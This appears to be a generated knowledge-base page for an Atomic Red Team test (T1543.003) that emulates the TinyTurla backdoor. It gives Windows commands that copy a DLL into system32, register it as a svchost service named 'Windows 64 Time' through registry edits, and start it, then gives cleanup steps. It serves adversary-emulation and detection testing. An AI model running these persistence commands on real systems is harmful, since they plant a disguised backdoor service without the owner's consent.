---
atomic_guid: "ef0581fd-528e-4662-87bc-4c2affb86940"
title: "TinyTurla backdoor service w64time"
framework: "atomic"
generated: "true"
attack_technique_id: "T1543.003"
attack_technique_name: "Create or Modify System Process: Windows Service"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.yaml"
build_date: "2026-04-26 14:38:40"
executor: "command_prompt"
aliases:
  - "ef0581fd-528e-4662-87bc-4c2affb86940"
  - "TinyTurla backdoor service w64time"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# TinyTurla backdoor service w64time

It's running Dll as service to emulate the TinyTurla backdoor

[Related Talos Blog](https://blog.talosintelligence.com/2021/09/tinyturla.html)

## Metadata

- Atomic GUID: ef0581fd-528e-4662-87bc-4c2affb86940
- Technique: T1543.003: Create or Modify System Process: Windows Service
- Platforms: windows
- Executor: command_prompt
- Elevation Required: True
- Source Path: atomics/T1543.003/T1543.003.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1543-create_or_modify_system_process|T1543.003]]

## Input Arguments

### dllfilename

- description: It specifies Dll file to run as service
- type: string
- default: $PathToAtomicsFolder\T1543.003\bin\w64time.dll

## Executor

- elevation_required: True
- name: command_prompt

### Command

```commandprompt
copy "#{dllfilename}" %systemroot%\system32\
sc create W64Time binPath= "c:\Windows\System32\svchost.exe -k TimeService" type= share start=auto
sc config W64Time DisplayName= "Windows 64 Time"
sc description W64Time "Maintain date and time synch on all clients and services in the network"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /t REG_MULTI_SZ /d "W64Time" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /t REG_EXPAND_SZ /d "%systemroot%\system32\w64time.dll" /f
sc start W64Time
```

### Cleanup

```commandprompt
sc stop W64Time
sc.exe delete W64Time
del %systemroot%\system32\w64time.dll
reg delete "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Svchost" /v TimeService /f
reg delete "HKLM\SYSTEM\CurrentControlSet\Services\W64Time\Parameters" /v ServiceDll /f
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1543.003/T1543.003.yaml)
